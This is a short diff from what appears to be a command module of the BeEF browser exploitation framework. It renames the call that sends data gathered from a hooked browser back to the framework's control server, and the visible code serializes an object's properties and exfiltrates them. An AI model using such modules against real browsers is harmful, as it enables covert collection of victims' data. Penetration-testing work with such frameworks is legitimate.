@@ -8,7 +8,7 @@ beef.execute(function() {
 			result+= n + " " + e[n] + "\n"; 
 	} 
 	
-	beef.net.sendback('<%= @command_url %>', <%= @command_id %>, 'result='+escape(result));
+	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result='+escape(result));
 });
 
 
